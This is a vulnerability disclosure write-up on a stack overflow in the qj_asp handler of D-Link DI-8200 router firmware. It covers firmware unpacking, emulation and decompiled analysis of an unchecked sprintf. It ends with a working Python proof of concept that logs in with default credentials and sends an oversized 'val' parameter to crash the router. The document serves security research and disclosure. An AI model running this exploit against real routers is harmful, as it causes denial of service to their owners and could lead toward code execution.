# D-Link DI-8200 Stack Overflow Vulnerability

## Firmware Extraction and Emulation

Get the DI-8200 router firmware, use binwalk to analyze and unpack the firmware, and extract the file system:

```shell
binwalk -Me DI_8200-16.07.26A1.trx
```

![p1](./pic/p1.png)

Use FirmAE to simulate firmware running:

```shell
sudo ./run.sh -d aa ../CVE/DI_8200-16.07.26A1.trx
```

![p3](./pic/p3.png)

## Vulnerability Analysis

Extract the firmware file system and find a stack overflow vulnerability in the qj_asp function of the \usr\sbin\jhttpd file:

![p2](./pic/p2.png)

The qj_asp function is implemented within jhttpd to process parameters for the qj.asp page. After logging into the router, it can be accessed via http://\<ip\>/qj.asp. The val parameter can be used to pass any value. The value passed in is retrieved via the httpd_get_parm function, which is then formatted using the sprintf function and assigned to the stack variable v9.

![p4](./pic/p4.png)

The variable v9 is a 200-byte character array. Since the value of the val parameter can be controlled by the parameters passed in by the front-end and the parameter variable is not checked or filtered during formatting and assignment, the value of the val parameter can be controlled to cause a stack overflow in the program, resulting in a denial of service or even command execution.

![p5](./pic/p5.png)

## Vulnerability Verification

poc:

```python
import requests

s = requests.session()
url = "http://192.168.0.1"
headers = {
    "User-Agent": "Mozilla/5.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "close",
    "Upgrade-Insecure-Requests": "1"
}
data = {"user": "admin", "password": "admin"}
s.post(f"{url}/login.cgi", headers={**headers, "Content-Type": "application/x-www-form-urlencoded", "Origin": url, "Referer": f"{url}/login.html"}, data=data)
p = b'a' * 0x500
r = s.get(f"{url}/qj.asp?val={p}", headers=headers)
print(r.text)
```

Before executing POC, the router is accessible normally:

![p6](./pic/p6.png)

Executing the POC will cause a stack overflow, causing the router to crash and thus achieve a denial of service attack:

![](./pic/p7.png)

![p8](./pic/p8.png)

